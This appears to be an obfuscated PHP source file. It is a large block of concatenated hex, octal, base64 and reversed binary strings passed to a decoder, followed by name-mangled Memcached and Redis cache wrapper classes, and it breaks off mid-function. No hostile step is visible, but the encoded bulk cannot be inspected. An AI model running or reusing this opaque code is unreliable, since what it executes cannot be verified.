¿­<')."\x71\x2f\xaf\x16\xb0\xca\xa1\x4d\x8b\x2b\xf8\xd9\xc6\xc3\x77\x6c\x1a\xbb\xfa\xe\xe\x88\x97\x7d\x5a\x11\x30\x4\xa3\x28\xc\xd6\x9b\x27\x1f\x3c\x74\xe0\xf2\x43\xf7\xec\xc4\x48\x72\xc9\xc6\x43\x1b\xef\x1a\xdd"."\xb9\x7f\xf4\x7b\xdf\xe6\x9f\x1d\xbd\xf3\x4e\x31\xca\x31\x3f\xf1\xdd\x55\x81\xe0\x9e\x8d\xd3\x81\xe4\xf6\xa\x85\xeb\x42\x49\x72\x1f\x27\x13\x39\xcc\x78\x71\x97\x5f\x58\x2\x45\x9d\x19\x30\x7e\x8a\xf8\x1d\x0"."\xc7\x37\x8d\x6c\xd1\xa2\x71\xcc\x37\x99\x69\x18\xfb\x75\x55\x88\x7c\x56\x35\x54\x4d\xae\x41\xbf\xb5\x55\x9e\x2a\x7c\xba\x20\x71\x4c\x40\x71\x2\x69\x47\x55\xc3\xe4\x1a\x12\xa8\x5\x3b\x40\x23\xb0\x77\x48\x6"."\x8b\xc5\xc2\x3\xb9\xec\x62\x44\x3d\xa4\x7b\xcb\xc5\x64\x2b\xc2\x1b\x5d\xbd\xbf\xde\xcf\x36\xbf\xc5\x6b\xf1\x17\x85\xbb\xaa\xe\xbe\xe7\x8\x7f\x0\x74\xf7\xa1\x7e\x46\xd8\xe5\x66\x54\xb7\x7\xcd\xa2\xac\xb2"."\x5c\xcf\x9e\x48\x65\xa4\xbd\x23\x67\xc1\x2e\x40\x4d\xec\xb\xa1\x16\xa0\x1e\x55\x25\xdc\xbe\xb5\x1c\xe9\xa0\x40\xf\x55\xa\x76\x80\xff\xfc\x96\xd1\x4d\xb7\xbe\x76\xf5\x1e\x37\x2c\x95\x9a\x0\x2c\x66\xd1\xca"."\374\35\322\307\26\243\227\137\123\376\75\2\357\374\32\3\36\75\157\347\241\53\135\220\114\177\126\221\304\143\242\0\301\176\27\35\341\173\203\134\204\342\373\377\146\25\121\141\145\3\26\333"."\323\204\25\336\216\302\160\51\357\305\342\53\157\102\266\30\351\162\331\123\347\204\307\2\50\47\274\314\63\244\304\336\233\23\101\352\112\250\101\221\35\175\111\166\271\211\160\223\156\156\114\243"."\x9\xd2\x30\x3b\xc1\x92\x4\x6b\xd1\x2b\x9e\x96\x60\xe\x41\x75\x72\x8\x67\xba\xda\x8b\x35\x52\xbc\x88\xcd\xc7\x6b\xc\x2d\x5c\xdb\x90\xbc\x13\xc8\x20\x4e\xcf\x51\x6e\x7f\x52\xee\x51\x20\x45\xb0\x34\xd4\x2b".base64_decode('+7IaQucwnI09lHixbNVrpMfLEYSjYlNT4BGgEkhHyUi7P0k0b7wl/li0YqXyKZEBkE6EeQ==').base64_decode('fbKTCyxM8/IrQrcPDXGy1sr9f6zMpZX6mQ2z56P/gctgikOlAtP0R0HmH+R0fy+jNcITFA==')."\xeb\x1b\x9e\x70\xc9\xa1\x8a\x23\x59\xc\x23\x77\xf1\xc0\x88\x94\x3\x4e\xb4\xd6\xe1\xc7\xc\x3a\x4a\x5\x3b\x92\x7\x18\x72\xb1\x43\x49\x14\x56\xa7\x53\xb9\xa7\x9c\xa\xd4\x1a\x1d\xd1\x19\xdf\x5\x5c\xa8\x64".base64_decode('LJpPSB8LFDm8JpZIT7Zf9ITQF8DwftRQU5yaCL8qUYZUppTvb5QyFds0lZyWHz6dJk6xGg==').base64_decode('plgL8Ica8XMOawpziiTMJuO9ShjEpOacIIdeY/mwczMf3gjjJW4fnBnihhEkQmEabidbAA==')."\154\212\324\355\24\144\104\72\226\204\243\222\106\240\224\240\6\233\243\152\240\275\275\142\206\374\15\77\126\247\361\255\221\74\137\322\320\102\164\132\123\122\370\355\120\143\25\116\255\122\254\142"."\212\31\226\256\362\203\202\31\1\20\114\323\102\3\212\124\343\42\112\57\102\41\57\11\321\354\352\105\13\375\6\224\364\371\317\300\44\335\217\125\353\362\123\361\4\313\232\76\44\265\105\130".base64_decode('y1KUhZpCh7KxmlyjVCsZtO1zveJF7sLcU9lCvyZn4sUVN9mRkh/jB7hxyIo3aAHJGD5xKg==').base64_decode('FNTyy8qL4Mp9KTmrk74b65anj7zYKi/tJwIjv5BfqNSjZ+X7R37tVgExsI4MwnmmnKCl+g==')."\x31\xd6\x89\x2d\x2\x9a\x1\x19\xed\x58\x1a\x41\x33\x1c\xee\x3f\x6c\x49\xd9\xa9\x84\x1f\x2e\x92\x4b\x9c\xa2\x70\x92\xb6\x6e\x1d\xad\x8\xbb\x85\xd9\xb0\xa1\x3c\xd\xd4\xa7\xdd\x59\x81\x82\xe1\x4e\xc2\x18\xe4".base64_decode('TsNSIZGG9jrnZyj2ykAihcHQX1EmEl0iIvQ878jsZIpPJNbVWe2btmGD32BKhkyViZX1cQ==').base64_decode('aBrv8jnhUU9g6DkgJLghKR97FizCif5p4rElVyZUsIZhY+OiTs5edbM8lQhT5Llj7KkxYw==')."\36\103\12\164\176\114\56\347\301\140\124\60\340\104\155\13\261\333\56\325\55\331\115\65\137\72\224\30\371\210\344\57\340\264\156\275\130\270\232\223\311\27\15\7\12\5\7\325\141\21\174\351".base64_decode('lTV6/JxU0IswX0o8eGQghFC50rH6oCsDuyYgyQOIyppFTtp4OqqLJ8JKwORHojY8e6GVKg==')."\x1a\x5\xdb\x41\xfa\xa8\xe7\xe4\x2a\xe2\xb0\x6c\x8d\x36\xa0\x51\x90\x2a\x5\xa4\x7a\x8d\x55\xc4\xdf\x44\x15\x22\x75\x34\x87\xd1\x3b\xde\xc0\x85\xf8\x6b\x88\x6d\xce\x36\x56\x91\x4e\x58\x19\x5d\x47\xe5\x9\x39"."\xab\xf4\x11\x54\xb0\x4a\x61\x4\x37\xa7\xf1\x71\x2c\xda\x26\xda\x67\xf9\xd3\x3a\x70\x2\xd9\x11\x87\xe7\x4a\x81\x28\x5c\x3f\x9e\x71\xe\xfd\x9d\x7c\x6\x9f\x57\xec\xa1\x32\x8b\xf8\x69\xf2\x18\x83\x90\x36\xc2"."\xb4\xf7\x62\x69\x2d\x5\x2\x67\x94\xed\xf1\x58\x32\x16\x64\xbe\xde\x9c\x62\x5d\x9a\x36\x8b\x1d\x40\x2c\xfa\x74\x54\x9c\xd9\xd8\x93\x3a\xae\x6d\xc4\x20\x38\xe7\xe1\x87\x14\xc0\x86\x62\x29\x9f\xe7\xea\x9f\x18"."\xa5\xf9\xf6\xd8\x58\xf9\x4f\x27\xb9\x21\xd5\xd3\xdd\xe3\xe4\x2b\x9d\x1a\xbb\x3f\x5\x2\x4c\x2f\x84\x13\x99\x92\x2d\x76\x68\xec\x31\x22\x89\x9f\xc1\x5b\x90\x2c\xd9\xdb\xc4\xd6\x3e\xf5\xb4\xaf\x93\x3e\xdb\x6f".base64_decode('rGMPqpiyqXhOySDlHAXvHt3yavIDhRWLrxpf+YETpmpPdY1vWm11eQ5V63XmY+049awEyg==')."\4\227\107\300\5\220\207\213\301\110\70\24\115\252\141\140\0\146\324\317\365\325\211\327\204\206\45\154\347\322\160\120\66\106\200\107\325\347\350\126\205\241\241\167\56\111\256\224\252\347\35\222"."\x5a\x3a\xa4\x59\x93\x59\x56\xad\xaf\xab\xab\xf3\xd6\xcd\x40\xff\xb3\x57\x16\xcc\x9e\x63\x43\x5d\x5d\x19\x48\x5d\x5d\x3\xf9\x9f\x66\x10\x7f\x66\x80\x82\xce\x1c\x44\x35\x19\xb9\x7\x80\x41\x5d\x87\x6\xc1\xf6"."\x8a\x4e\xd1\x25\xc6\xab\x76\x6\xf1\x5b\x50\x5\x37\xd\xa6\x45\x28\xd5\x22\xec\x23\x6\x4f\x19\xe5\x75\xb8\xcb\x54\xc8\xfd\x3f\xc4\x74\xf7\x20\x70\xc5\xa\xc0\x67\x76\x73\x40\xad\x58\xb3\xdd\x14\x35\xa4\x8f".base64_decode('DAq0lz8tRmBi1Sygr7obeaNC+XSn/DEfG1yaKCy4e1mGV/aiAoUooRN3ho6moTJOS6o4BQ==')."\x31\x3f\x29\xde\x4f\x9c\x20\x49\x71\x31\xff\x2b\x59\x87\xc5\x51\xf9\x6a\x90\x64\xf3\xf7\xb9\x24\x96\xe5\x46\x42\x70\x34\xca\x6b\xa2\xbe\x84\xa8\x73\x18\x18\xc3\xa\xab\x30\x63\xe\xaa\x82\x7d\xc1\xd1\xb3\x78"."\214\14\51\76\211\62\64\114\113\157\250\361\270\262\75\111\2\347\12\154\102\373\7\224\231\210\75\214\176\303\151\231\103\225\212\312\143\273\0\3\262\236\44\235\45\161\105\210\176\5\270\107"."\x25\xaa\xbf\xcc\xda\xa6\x0\x45\xa1\x51\x62\xcf\x9d\x3a\xe9\x25\xb2\x9d\x86\x89\x65\x93\x6b\xbb\x27\x96\xcc\x91\xe3\xd2\xc3\xad\x35\xc8\x62\xd2\x4c\xb1\x7b\xb0\xc4\x67\x28\xf6\xb1\x94\x10\x4b\xa0\x37\x78\x41"."\156\106\125\252\300\235\345\52\23\240\327\147\145\5\40\275\34\232\334\62\126\200\306\351\56\150\142\60\65\310\355\102\313\126\124\251\130\112\122\40\263\300\223\205\320\336\141\165\14\110\207\124"."\137\241\150\366\241\131\267\344\101\103\351\355\225\223\71\170\71\144\5\40\336\172\31\116\116\304\367\231\314\373\67\240\263\60\111\240\245\371\346\50\201\212\63\243\224\350\134\315\122\106\220\73"."\76\223\23\361\241\127\326\327\42\7\17\147\35\370\64\355\114\341\55\373\24\244\143\122\20\33\134\303\313\152\314\24\114\120\44\54\241\222\275\73\252\16\64\141\270\312\324\303\360\10\11\105"."\xc\x67\x3a\x4d\xa3\x72\xa\xc7\x25\x71\x92\x10\xba\xac\xce\x3c\xd5\x3\x29\x24\x8b\xa\x57\x10\x61\xce\x8b\x13\xe\xa3\xe3\x80\xa6\xd\x8c\x17\x91\x8b\x39\xf3\x5e\xd9\x7c\x39\xb\x5c\xc1\xa0\xf0\xb0\x72\x3f"."\x9b\xf2\x75\x1c\x1e\x52\x55\x16\x21\xe1\x15\xdd\xca\x9d\xa1\x57\x40\x44\x27\xb2\x95\x61\x15\xd9\xb7\x71\x5\xd\x9c\x14\x4a\x31\x5c\x3b\xbb\x9\x45\x7\x69\x8b\xa\x44\x3d\x38\x59\xa1\x4e\xb5\x15\xec\x2a\xfc"."\164\347\374\224\27\0\367\143\46\342\36\261\115\146\271\20\256\253\303\105\242\226\72\50\42\157\53\145\335\230\152\253\62\305\127\17\152\267\123\230\163\17\112\217\205\226\205\37\272\335\211\272"."\325\215\116\103\142\67\201\11\351\244\324\230\325\211\233\14\241\64\233\37\305\271\273\112\173\205\42\127\204\166\335\144\6\113\177\272\25\322\314\5\304\65\104\205\134\154\164\203\175\215\333\247"."\6\312\217\140\114\233\237\240\161\365\201\264\264\175\106\144\376\66\111\213\170\27\211\246\72\24\14\44\333\370\34\24\65\203\65\136\143\155\43\252\242\304\265\200\164\250\167\105\335\212\265\270"."\204\304\321\240\250\264\363\222\175\337\146\133\67\363\74\40\24\122\111\120\20\340\127\256\331\314\2\233\4\36\45\44\75\306\12\355\203\132\171\235\270\5\222\277\172\140\140\212\172\312\54\246"."\361\206\50\331\262\311\333\161\275\117\216\22\135\6\266\32\204\365\162\271\12\154\40\114\42\73\170\25\6\122\166\111\66\67\46\71\70\100\61\311\221\205\304\210\172\147\50\234\203\125\151\315"."\x34\x32\x5d\xca\x20\xf0\x95\x98\x59\x97\x30\x57\x7a\xdd\x46\x84\x57\x89\x52\xf\xbf\x9a\x76\xb1\x98\xec\xc1\x9c\x22\x73\x70\xec\x5\x1c\xae\x80\xd8\x7f\xc2\x3d\xb0\xe4\x3c\x54\x2d\x36\x2c\x2e\x7a\x26\x17\x21"."\xdf\x2c\x2b\x42\xf3\x30\x13\x25\x9e\xca\xc9\x39\x16\xf6\x50\xd1\xc1\x66\xb1\x52\x4e\x85\x4f\x91\x2c\x69\x44\xb9\x45\x49\x58\xe5\x2b\xc5\x20\x41\xc6\xb0\xce\x34\xb9\xbd\x33\xea\xbd\xcc\xa4\xa5\xfc\x7c\x8e\x1d"."\xce\x60\x1f\x41\xb\x4b\x42\x3\x7c\xbc\x65\x64\xc\xf4\xa0\x1\x4e\xc0\x98\xd2\x5\x3f\xb1\xb8\x24\x6c\xcb\x10\x23\x52\x7c\x3e\x89\xb5\x29\x1e\x2b\x4a\xbc\x84\x70\x43\x4f\xcc\x31\xc9\x64\x5d\xe8\x2f\x51\xd5"."\x69\xc\xd0\x51\x29\x9f\x8e\x10\xce\x6e\x76\x28\xbb\xbb\x0\xd0\xfa\x70\xe6\x83\xaf\xa\xd1\x18\x6a\x11\xca\x74\x28\x1f\xba\x2a\x1\x87\x28\xb2\x37\xe\x52\x4a\xf4\x43\xbc\x8\x40\x49\x26\xf5\x88\x21\xd\x8c".strrev('\\°KwsI¼Hcƒ_Ì6Ù C€ÎØµ5¼N'."\0".'gjJ¡+\\ºå‰äÒrDäN“Øª†¢ÃĞ')."\234\226\43\102\25\76\35\245\171\22\207\32\144\106\76\371\111\275\275\265\335\317\223\232\370\362\244\202\22\141\7\57\310\264\52\365\41\35\16\170\203\71\43\245\104\142\113\302\301\100\244\71".base64_decode('nFiq9OFLWaF1iJqrkmWrWsLrC3Fz41zgRLxMp4Pheg93uYKD3h50jvCm+VnLEqcq0kOoTA==')."\xf8\xa7\x73\x56\x4b\xb1\x52\x2f\x96\xd5\x98\xc7\x2f\xfb\xb2\x65\x65\xb0\xd0\xbc\x2\x74\x56\x88\x88\x25\xe0\x42\x51\x2f\x87\x1f\xd6\xb1\xf6\xa3\xd4\x62\xa9\x40\xa9\x42\x6b\x0\xbe\xf2\x17\x88\x9f\x1c\x19\x1a"."\xb1\x47\x7a\x7e\xbc\xc6\x1b\xf9\x1\xc3\x32\x4\x39\x60\x25\x86\xe5\xda\x3\xcd\x6d\xe1\xa8\x1a\x88\x44\x62\xcb\x1d\x4a\xc3\xe2\xba\xa0\xc8\x5\x29\x69\xd9\x67\x91\x34\x33\x62\x12\xe8\xd7\xcb\x8d\x30\x82\xc9"."\x3b\xd9\x1f\x84\x4b\xb8\x42\xa7\x4f\xb6\xe6\x59\x60\xf7\x5f\xe0\xea\x95\xfb\x30\xa1\x51\xc9\xa7\x58\xa1\xa8\x19\x96\x2e\x25\x50\xf7\x57\xd3\xe0\x21\x9d\x96\xcd\x3a\x3c\x84\x66\x7b\xa5\x68\xc9\xb9\xdf\x56\xfc"."\224\112\77\300\322\10\243\73\76\100\74\274\244\65\371\77\156\252\221\26\166\372\214\64\323\112\343\317\245\251\173\223\240\354\354\226\175\123\70\321\51\117\371\237\372\144\363\110\236\162\211\235"."\63\346\374\321\44\307\46\340\351\151\132\70\246\122\77\267\342\23\210\213\51\16\27\344\113\134\177\32\152\300\26\111\103\354\302\20\107\304\271\5\103\101\45\370\53\364\64\213\16\351\130\240"."\xc8\x4e\x38\x4c\x38\x87\xc8\x8\xc\xb8\x43\x13\xd3\xe5\x54\xce\xad\x3b\xef\x70\x19\x57\xf6\xd\xe2\xc1\x84\xe6\x91\xcb\x2b\x4\xd9\x2d\xfa\x84\x62\xdc\x63\x91\x28\xea\xce\xa9\xd0\x0\x94\xad\x8\x91\x17\x7".strrev('Ğ“½åTÉ²6ÄñEœçG€\\ŠË4%4ùVı\'°W(`ªÄâ£2Q£{ßê:•P')."\141\161\376\303\112\232\146\156\270\54\301\41\35\213\260\336\160\165\151\354\301\47\337\153\312\243\116\350\71\176\112\105\275\227\122\101\204\7\235\107\164\273\334\17\32\55\376\177\123\220\146\46"."\44\363\262\316\112\312\33\144\271\367\117\301\313\141\27\157\31\163\320\351\322\24\247\270\235\272\71\334\271\111\53\214\230\70\220\35\320\71\13\171\312\74\51\51\304\131\266\202\210\21\314\75".base64_decode('VvNhB10CLH16Cv3pgl+2G7obQekcfLKWo2IwY2TTRa7AJRLadCF9IKUQYSlozCk4cffYzA==')."\110\72\70\157\252\344\351\17\333\22\165\372\240\22\256\275\304\326\353\164\165\304\125\4\54\261\204\54\333\341\134\53\151\46\265\76\17\105\125\114\24\105\254\151\130\16\313\52\374\244\27\50".base64_decode('k0kI03y+F0kAzF9m2kOcOVK66PYOJa1PTn7l0n1Zs0fLgnah4+FdER3RdLaFOMBokl8rFA==')."\304\175\210\274\343\242\177\35\157\252\41\257\43\331\252\22\373\42\52\325\153\110\10\234\223\356\50\151\42\334\127\226\362\141\172\57\343\110\55\112\207\107\331\60\63\275\253\21\117\163\1\34"."\265\263\235\336\337\302\200\311\125\262\73\165\56\147\107\364\210\237\261\375\345\167\360\130\61\15\50\12\161\112\57\364\123\210\261\17\371\164\7\0\312\102\105\240\206\143\41\143\124\102\54\66"."\x75\x97\x49\x28\x85\x4c\xd1\x3e\x25\x55\xf2\x5c\x6\x6e\x39\x2b\x39\x22\xa3\x98\x4f\x7e\x9a\xf5\x5e\x7e\x52\xc2\x71\xc1\x1b\xc8\x36\x92\x84\xba\x8e\xdb\x63\x66\xb9\xf7\x4f\xe6\xe9\x93\x2d\x1d\x70\xf3\x59\xc1"."\167\347\270\256\77\75\342\25\366\247\371\67\23\157\176\235\316\334\161\77\70\147\301\17\43\145\347\31\367\121\206\17\253\253\100\334\75\310\111\263\134\350\54\264\24\34\216\111\245\136\3\151"."\x2b\x77\x6e\x2a\xd\x83\xd4\xef\x52\x31\xeb\x21\xa\x1b\x1e\xa6\x23\x59\xd1\x3f\xaa\xc3\xdb\x9a\x7b\x42\x2b\x78\x58\xfd\xcc\xa\xe1\x8d\x4\x39\xc9\xa5\x9d\x54\xaf\x61\x61\x4f\x91\x5d\x5b\xbb\xc1\xc\x7\xee"."\xa2\xd\x58\x3c\x4\xa4\x66\x98\xcb\x36\x88\x95\xb9\x74\xfd\xcc\xd9\xf3\x65\x89\x89\x98\x42\x71\x99\xb\x36\x55\xe0\x4e\x1a\x78\x1c\x81\x14\x8a\x13\xd\x15\x66\xfb\x59\x5e\xfd\x24\xd3\xf9\xe8\xa6\xdc\x19\xaf"."\x6b\x7\xf8\x9f\x2d\x18\x71\xf8\xa0\xa0\x92\x1e\x6f\xb9\xdb\xf2\xb2\x11\x20\x78\x2a\x69\x93\x49\x1b\xa2\x4b\x35\xc8\xc4\xda\x3a\x96\x58\x75\x74\xb\x14\x2e\x78\x9d\xdf\xa2\xec\x43\x85\x7e\x48\xfb\x9e\x58\x2c".strrev('gËVD‹ï\\%òİ6Ñ®L¹ÒÙ¢ SÊœÄWL°ñ‚FEØéZ<óš‹°¾÷Å™ªÔ')."\x61\xdb\xc6\x26\x2a\xc4\x6a\x93\x28\xd1\xff\x60\x2\xd9\x11\x8b\x9e\xc6\x84\xd6\x18\xee\xbe\xe3\x64\xee\x1c\x5\xff\x99\x8c\xcc\x54\x70\x9d\x2b\x29\xcc\x7c\x4a\x1f\x28\xa7\xc7\x8f\x96\x5e\xcd\xf6\x4a\xc8\x29"."\xc9\x27\x75\x3b\x46\x26\x1b\xc8\x85\x38\x1\x3b\xfb\xed\xaa\x1e\x15\x13\x75\x74\x7b\x94\xf1\x80\xca\xd9\x3d\xc9\xc3\xae\x30\x8b\x28\x31\x7a\xb8\x34\x7b\x60\x3e\x8e\x0\x81\xbc\x6f\x76\xb2\x4c\xb2\x3\x50\xf2"."\70\130\330\357\41\113\327\261\214\45\123\353\362\343\132\122\221\274\76\312\253\226\334\251\12\261\23\221\123\101\217\140\161\23\15\12\322\314\300\22\376\64\133\223\124\0\235\262\60\140\356\44"."\137\340\150\370\44\167\331\246\34\226\334\364\242\75\41\306\236\127\240\346\70\216\261\50\336\354\162\245\116\350\227\333\277\72\33\63\102\64\4\75\224\236\374\73\216\112\334\303\244\343\350\144"."\271\335\314\42\126\320\341\14\44\135\346\231\33\10\47\171\140\107\277\46\155\275\142\227\25\241\150\51\47\42\222\104\231\234\267\170\246\303\62\2\66\376\347\242\21\314\336\202\345\362\76\115".base64_decode('bYfTMDsW/K89rP6/cqw6u47J/h0O2ZcAcw6txResXNZB5c6ufji31+MAi9Dg+yR/8CTOlQ==')."\xcc\x99\x1\x48\x66\x17\x52\x63\xf7\x6f\x5a\x36\x2b\x6d\xc2\x95\x8f\x33\x65\x6e\xaf\x11\xf2\xf5\x73\x57\xc9\x95\x22\xee\xe7\xc3\x6e\x17\xd8\x9d\x44\xec\xcb\xbc\x5b\x77\x57\x2\x14\x74\x89\x9f\x9a\x2a\xe0\x31"."\x4d\x62\xcc\xb2\xa0\x49\x79\x23\xd5\x5f\xe1\xf2\x9c\x28\xd2\x3a\x6d\xfd\x4b\xcc\x49\x19\x98\x68\x3\xe2\x61\x98\x65\x4d\x3f\xb\xa5\xf0\x71\x91\x58\x91\x81\xd1\x93\x5f\xfa\xc7\xa\xec\x60\x59\xb\xbb\x40\xf7"."\231\214\132\21\353\42\100\264\144\102\345\110\52\43\157\111\307\234\70\22\345\341\26\64\310\307\246\323\121\242\315\345\321\227\2\131\362\330\72\356\13\312\165\51\312\113\163\72\40\27\301\272"."\xfd\x4e\xd1\x18\x9e\x60\xdc\x30\x6f\x9d\xd7\x95\x30\xc3\xeb\xaa\x8e\x3b\x35\x76\xe2\xba\xc3\xcb\x2e\xd5\x3f\x41\xb\x24\x8e\x45\x20\x4c\x14\x46\xae\x9c\xc8\xdd\xb3\xb7\xbc\xc\xc5\xeb\x84\x80\x19\x67\x65\x55"."\136\337\274\121\102\34\210\103\362\170\60\72\321\136\64\11\243\350\114\345\142\41\111\245\72\45\311\134\335\274\37\115\236\342\53\333\265\30\311\164\314\24\126\330\23\127\235\311\130\74\244\56".base64_decode('D2OrFOFVoQ5mT9kwiS8RVmVHWw152AYLAJ1iWkyBSjoiZpIAWBgFtnOFIL+YdT6Plh5RMA==')."\223\134\262\110\322\11\214\137\302\70\327\342\242\112\140\51\263\150\311\26\65\35\231\230\355\62\121\156\234\235\243\73\362\150\41\353\51\133\117\53\170\3\167\360\364\235\263\352\146\166\177\132"."\x2d\x28\x9f\x43\xce\xfa\xc\x48\x38\x5c\x24\x66\x7a\x99\x6e\x2f\x83\xa9\x58\xce\xa4\x26\x74\x2a\xe5\x61\xff\xf1\xb6\x3\x89\x84\x23\x1a\xb7\x3\x9a\x16\x87\x79\xaa\x6\x49\x44\xaa\x10\x43\x5d\xe0\x89\x68\x9c"."\xb9\x89\x9a\x41\xc1\x5a\xb8\xf2\x30\x69\x18\x3f\x17\x9f\x4e\xf9\xed\x33\xf3\x5b\x82\xf5\xe6\xfc\xd8\x8e\x17\x7e\xbf\xe1\x27\xf8\x7\x92\xed\x95\x6a\x4e\x65\x6a\x44\x58\x26\x20\x24\x3b\x84\xe2\x96\x9f\x9\xe1".base64_decode('S3ZxOFaM5/izDSLNoQIah5wGtAXkJOn2HB220k7XXSSTJDPD3VCDdP/rvH7nT17L9r+SEQ==').base64_decode('kbJJKWYAFv3i1/thYUWJZNM7rMCAxg2VuUt1OA6y0mV9ilCIUPl9rLgmlrhHVgyfhMXG7g==')."\x4a\x97\x28\xaa\xd8\xf3\xb4\x1\xc1\xb\x8b\xb3\x58\x3a\xdd\xa2\xd\x54\x0\x4d\xeb\x6e\x43\x73\x28\x85\x83\x12\x5e\x5a\x32\xbb\x21\xde\xd2\xe8\x83\xf2\xd7\x1\x4e\x3c\x75\x71\x0\x96\xa7\xa\xb3\x1c\x52\x79".base64_decode('cQcnuonTKnWfUDhncdnsB0cqkURdM3HNFunci1V/hMoL7QoX74hPOo2McDA+ZwiGPMLzOg==')."\x52\x5d\x27\x79\x2c\x49\x63\x7c\xa0\x2b\xb\x64\x4b\x52\xf5\x15\x45\x50\x12\xa\xe8\xd9\x88\x54\x9d\x7c\x3f\x3f\x6e\x81\x44\xe5\x8f\x8\xac\x74\xe\xb1\x64\x9d\x45\x64\x30\x96\xc5\x74\xc\xbe\xb4\x67\xf1\x8e"."\x1\x64\x5c\xce\x74\x34\xc7\x3d\xb5\xe4\xe0\x29\xd0\x97\x26\xe6\x88\x18\x9f\xe6\x5\x9c\x59\x14\x5e\x77\xb5\x5e\x2e\xe0\xee\x19\x2d\xe1\xf0\xda\x27\xa7\xf\x1a\x76\x2a\x23\x9d\x92\xcb\x33\xcb\xd3\x8b\x65\x83"."\xd\xd\xa8\xdc\xf\x77\x6b\xd9\x58\xbb\x65\x7\xa2\x92\xb2\xf6\x48\xca\x3f\x49\xb3\x42\x19\xda\xa2\x8a\xc5\x68\x16\x2e\x29\xe\x27\x8e\xb2\xe3\xc\x1\x2e\x4b\xb3\x70\xd9\xb2\x6c\x56\xb8\x6c\x5c\x49\x39\x5b"."\x2b\x59\xe3\x74\xaf\x7c\xf0\x40\x16\x95\xae\xd0\x61\x21\xb1\x91\x40\xc7\x1b\xcf\x8a\xc0\xe5\x9f\x3\x4c\x74\x43\x13\xe1\x55\xe5\x56\x8\x99\x93\x4b\xdd\xa2\x52\x2b\x2a\x2\x8f\xdb\xa\x37\xb4\xe0\x39\xf0\x9"._kodDe('MECiMXy3VZGnkEIayfCVlJNWQlNKjxRBzlOsqnbY+OI0hoF/6SgbtkRjhBiFJVkZswdAl7k=')."\x76\xe4\x4a\x97\x7\x8\x6c\x8e\x3\x7\xd\x8\x8c\x58\xb0\xac\xd1\x2f\xd4\x3a\xd9\xab\x8e\x29\x8e\xad\xa4\x94\xef\xcf\x9b\x7c\x7b\x4a\xb\xad\x5d\xcc\x39\x5\x8a\xee\x71\x2e\xab\xcd\x89\xfa\xf9\x92\x64\xfd"."\275\342\43\23\17\26\14\225\213\140\262\32\177\20\50\64\337\350\231\331\264\215\224\356\64\61\57\33\166\244\371\354\43\131\111\14\355\222\0\13\61\225\103\1\246\202\134\224\44\1\307\54"."\56\143\150\175\22\163\44\160\302\361\6\214\262\44\160\207\105\257\277\203\130\47\203\137\174\22\73\347\164\13\247\331\11\263\150\173\160\136\322\54\220\337\46\323\266\205\66\11\225\13\21\66"."\33\357\303\36\111\131\12\205\304\55\47\156\24\271\76\43\150\113\50\26\11\302\105\74\26\270\44\164\232\113\350\234\43\202\257\345\170\104\336\146\341\102\276\245\344\122\31\20\11\375\146\272"."\307\34\142\326\24\21\136\111\203\44\56\356\64\67\157\51\330\42\100\105\131\365\213\130\43\261\374\64\307\17\376\214\274\244\16\360\106\352\133\123\350\163\24\247\376\35\271\342\366\247\325\0"."\xc2\x7b\x51\x5\x75\x66\x42\x24\xa9\xf0\x46\x2d\x91\x4c\x94\x65\xb5\x7\x12\x89\xe5\xb1\x78\x33\xf5\x7d\x52\x96\x4d\x4a\x49\xa\x76\x65\x59\xed\xad\xb1\xe8\x78\x79\xa1\xb6\x40\x38\x52\x96\x87\x75\xf1\xa2\xaa"."\260\313\111\263\302\355\244\225\344\356\171\274\126\204\203\113\105\113\312\315\241\262\273\262\10\70\254\24\363\42\335\35\25\62\46\273\22\142\360\11\55\313\204\101\322\335\202\236\23\206\133\105"."\31\247\214\113\236\177\213\131\130\346\1\247\303\101\227\152\54\103\154\250\10\153\326\105\241\356\170\1\122\261\317\30\116\37\70\237\57\324\73\174\16\65\20\51\235\254\41\102\224\44\334\224".strrev('*c!6¢¯­m²;'."\r".'$ö’¤0èg‚Êz.{¤{1®k(&YØn'."\0".'W$`÷å'."\r".'wÉ'."\0".'â­0’{÷')."\41\204\273\377\7\111\34\226\315\75\270\0\0"."".base64_decode('').strrev('').strrev('')."", 10, -8))); goto cº¯¦åÊšº; F„“ˆ¢…‚: class CacheMemcached { public $handle; public $cacheTime; public function __construct($³¬Äº”, $ Çó•§) { $§´¨åÒ =& $_SERVER[£ğ°ÖØø]; if (!class_exists($§´¨åÒ[930])) { show_json($§´¨åÒ[931], !1); } $this->cacheTime = $ Çó•§; $this->handle = new Memcached(); if (is_array($³¬Äº”[$§´¨åÒ[932]]) && count($³¬Äº”[$§´¨åÒ[932]]) >= 1) { foreach ($³¬Äº”[$§´¨åÒ[932]] as $É“ËñÛç) { $ƒüü²ÉÓ = explode($§´¨åÒ[4], $É“ËñÛç); $this->handle->addServer($ƒüü²ÉÓ[0], $ƒüü²ÉÓ[1]); } } else { $this->handle->addServer($³¬Äº”[$§´¨åÒ[208]], $³¬Äº”[$§´¨åÒ[209]]); } } public function set($‚«€ÛÕÚ, $äÕ¼§Ìì, $ÌÕï¯ë = false) { $ÌÕï¯ë = $ÌÕï¯ë ? $ÌÕï¯ë : $this->cacheTime; return $this->handle->set($‚«€ÛÕÚ, $äÕ¼§Ìì, $ÌÕï¯ë); } public function get($Ğê­ß) { return $this->handle->get($Ğê­ß); } public function remove($¿şºÔìÙ) { return $this->handle->delete($¿şºÔìÙ); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($Ò˜ÌÆœ, $âœÌ³¦õ) { $÷õè¡¯ =& $_SERVER[£ğ°ÖØø]; if (!class_exists($÷õè¡¯[933])) { show_json($÷õè¡¯[934], !1); } $this->cacheTime = $âœÌ³¦õ; $ÍÎÒæ‹š = isset($Ò˜ÌÆœ[$÷õè¡¯[935]]) ? $Ò˜ÌÆœ[$÷õè¡¯[935]] : 10; $Ÿçş€ãˆ = _get($Ò˜ÌÆœ, $÷õè¡¯[932]); if ($Ÿçş€ãˆ && is_array($Ÿçş€ãˆ)) { $this->initCluster($Ò˜ÌÆœ, $ÍÎÒæ‹š); } else { $this->handle = $this->init($Ò˜ÌÆœ, $ÍÎÒæ‹š); } } private function init($ªèÙç“Ç, $¿®¶Û) { $Ô¹ú…Ú‚ =& $_SERVER[£ğ°ÖØø]; $‰±›×´ı = new Redis(); $Õæ÷Å = isset($ªèÙç“Ç[$Ô¹ú…Ú‚[936]]) ? $ªèÙç“Ç[$Ô¹ú…Ú‚[936]] : !1; if ($Õæ÷Å) { 